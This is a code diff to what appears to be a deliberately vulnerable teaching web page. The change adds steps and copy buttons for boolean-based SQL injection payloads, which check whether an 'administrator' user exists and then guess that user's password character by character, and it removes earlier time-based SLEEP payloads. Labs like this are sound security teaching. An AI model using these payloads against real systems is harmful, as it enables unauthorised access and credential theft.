@@ -81,7 +81,7 @@ if (isset($_POST["code"])) {
         <p><b>Background: </b>We will be simulating a search function which is unprotected</p>
         <p>Based on the ID given by the user, it will retrieve and display the name and the address based on the ID.</p>
 
-        <b>Boolean Based Attack</b>
+        <b>Reconnaissance</b>
 
         <ol>
 
@@ -111,13 +111,33 @@ if (isset($_POST["code"])) {
 
                 <p><span class="code_space">1 AND 1 = 1</span> <button class="buttons" onclick="copyTextThree()">Copy</button></p>
 
-                <p>And now, with the intention of finding out if the users table has an account named "admin", an attacker can perform:</p>
+                
+        </ol>
+
+        <b>Using Boolean-based SQLi to guess the username and password from the users table</b>
+
+        <ol>
+
+                <li>And now, with the intention of finding out if the users table has an account named "admin", an attacker can perform:</li>
                 <p><span class="code_space">1 AND EXISTS( SELECT * FROM users WHERE username ='admin') </span> <br><br><button class="buttons" onclick="copyTextFour()">Copy</button></p>
                 <p>It will return no entry, thus meaning the username admin in the users table does not exist.</p>
 
-                <p>The attacker then tries to find out if the users table has the username "administrator", an attacker can perform:</p>
-                <p><div class="code_space">1 AND EXISTS( SELECT * FROM users WHERE username ='administrator') </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextSeven()">Copy</button></p>
+                <li>The attacker then tries to find out if the users table has the username "administrator", an attacker can perform:</li>
+                <p><div class="code_space">1 AND EXISTS( SELECT * FROM users WHERE username ='administrator') </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextSeven()">Copy</button></li>
                 <p>It will return an entry, thus meaning that the username administrator does indeed exist in the users database.</p>
+
+                <li>The attacker now tries to find out the password of the user "administrator", an attacker can perform:</p>
+                <p><div class="code_space">1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p' </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextEight()">Copy</button></li>
+                <p>If it returns an entry it means that the starting letter of the password starts with p</p>
+                
+                <li>The attacker then tries to guess the second letter after 'p'</p>
+                <p><div class="code_space">1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 2) = 'pa' </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextNine()">Copy</button></li>
+                <p>If it returns an entry it means that the the first two characters are pa</p>
+
+                <li>The attacker now makes the assumption that the adminstrator password is password. To confirm, the attacker proceeds to enter the following:</li>
+                <p><div class="code_space">1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 8) = 'password' </div> <div style="padding: 5px;"></div><button class="buttons" onclick="copyTextTen()">Copy</button></p>
+                <p>If it returns an entry it means that the administrators' password is password</p>
+
 
         </ol>
 
@@ -184,12 +204,17 @@ if (isset($_POST["code"])) {
         }
 
         function copyTextEight() {
-            var copyText = "1 AND IF(EXISTS(SELECT * FROM users WHERE username ='admin'), SLEEP(5), SLEEP(0))";
+            var copyText = "1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p'";
             navigator.clipboard.writeText(copyText);
         }
 
         function copyTextNine() {
-            var copyText = "1 AND IF(EXISTS(SELECT * FROM users WHERE username ='administrator'), SLEEP(5), SLEEP(0))";
+            var copyText = "1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 2) = 'pa'";
+            navigator.clipboard.writeText(copyText);
+        }
+
+        function copyTextTen() {
+            var copyText = "1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 8) = 'password'";
             navigator.clipboard.writeText(copyText);
         }
     </script>
